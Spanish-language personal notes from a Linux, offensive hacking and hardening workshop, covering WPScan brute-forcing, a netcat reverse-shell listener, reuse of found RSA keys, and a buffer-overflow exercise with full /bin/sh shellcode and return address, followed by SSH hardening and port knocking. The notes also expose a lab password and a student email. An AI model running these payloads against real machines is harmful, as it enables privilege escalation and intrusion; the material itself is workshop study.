# LINUX TALLER

## VIM
:wq write qui
:q! quit and force

## XARGAS
ejecuta algo como argumento final un output

## ALIAS
alias loqueyoquiera="ls"    cerrando la sessión pierdes el alias
para hacerlo fijo meter en /.bashrc el alias

# TALLER HACKING(Ganar root en una maquina con una pagina web que utiliza Wordpress)

## WPscan
utilzado para sacar información sobre los usuarios que se utilizan en la pagina basada en wordpress
también se usa como brute-force para paginas web basadas en wordpress

## Google dorking
buscador más profundo de información
site: sitio "keywoards"

## Netcad
Utilizado para abrir puertos en la maquina a utilizar como reverse shell
netcad -nvlp "puerto puesto" https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


## SSH
es posible utilizar la llave RSA para poder entrar con ssh utilizando el flag -i

buscar en un directorio llaves RSA existentes y utilizables:
find. -type f- -exec sh -c 'echo "Analizando archivo: $1"; ssh-keygen -l -f $1' _ {} \;

## DATOS TAREA OPCIONAL(COMPLETADA)
contraseña maquina wido T4ll3r_H4ck1nG_2024!
correo para el premio: sermomo3@alumni.uv.es


# Ejercicio extra Taller Hacking Ofensivo
**Ganar root privileges de una maquina utilizando una vulnerabilidad de buffer overflow**

run $(python2 -c 'print "A"*88')


run $(python2 -c 'print "\x90"*35+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x64\xf4\xff\xbf"')


/home/wido/pruebas_seguridad/script $(python2 -c 'print "\x90"*35+"\x31\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x64\xf4\xff\xbf"')


# TALLER HARDENING
Asegurar servidores y servicios.

## FIREWALL
iptables -L -nv (muestra las reglas)
preservar logs de las posibles conexiones
LAMP(Linux Apache MySQL PHP) para servidor web
VESTA
Nestia es un gestor instalable open source para gestionar el servidor

## Security SSH
Cambio de puerto sobre el 1000
Bloquear acceso de root utilizando SSH (permitrootlogin no)
Autenticazión de password (password authentication)
Archivo de config de ssh /etc/ssh/sshd_config

## PORT KNOCKING
Configuras firewalls que te permite conectar a diferentes puertos para luego conseguir abilitar la regla de abertura de SSH. En pocas palabras, tocas ciertos puertos configurados en el dispositivo y así puedes abrir y cerrar puertos.
knockd es el servicio utilizable(/etc/knockd.conf y /etc/default/knockd)
START_KNCOKD =1 para abilitar el knocking
KNOCKD_OPTS="-i eth0" para cambiar la interfaz a utilizar y luego abilitar con systemctl start knockd
knock -d 300 10.5.0.10(IP) 2024 2000 9898 para nockear y luego hacer ssh
y para cerrar knock -d 300 %IP% 9898 2000 2024

## OSSEC(HIDS)